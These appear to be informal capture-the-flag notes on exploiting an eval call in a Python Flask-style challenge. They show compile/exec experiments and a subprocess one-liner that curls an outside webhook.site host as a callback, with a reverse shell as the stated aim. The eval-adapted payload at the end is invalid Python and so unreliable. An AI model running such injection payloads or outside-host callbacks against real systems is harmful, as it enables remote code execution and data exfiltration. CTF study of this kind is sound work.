## dependencies
- jinja2
- its dangerous
## ..
- in app.py there is no where a mention of reading the flag
- ssti is also very less likely
- but there is a clear eval funciton
## compile and exec working
https://www.w3schools.com/python/ref_func_compile.asp
```
a=compile("print('radha likes chapath')",'filename','exec')
>>> a
<code object <module> at 0x7fda15b47590, file "filename", line 1>
>>> exec(a)
radha likes chapath
>>>
```
- first would need to run id command
- first eval will be done then exec
- so just in eval we can get rev shell
## eval
![image](https://github.com/m0wn1ka/ctf/assets/127676379/f89df957-4e6c-426f-86d6-e35cfaf62b5e)

- https://www.revshells.com/
```
python3 -c "import subprocess;subprocess.run(['curl https://webhook.site/db31d100-9c30-462b-bc60-0f3c967b42f0'], shell=True, capture_output=True, text=True)"
- running this in local terminal does send a req to webhook
```
### as it would go throug eval need to make it compatible with eval
```
python3 -c "eval(exec(import subprocess;subprocess.run(['curl https://webhook.site/db31d100-9c30-462b-bc60-0f3c967b42f0'], shell=True, capture_output=True, text=True))"
```

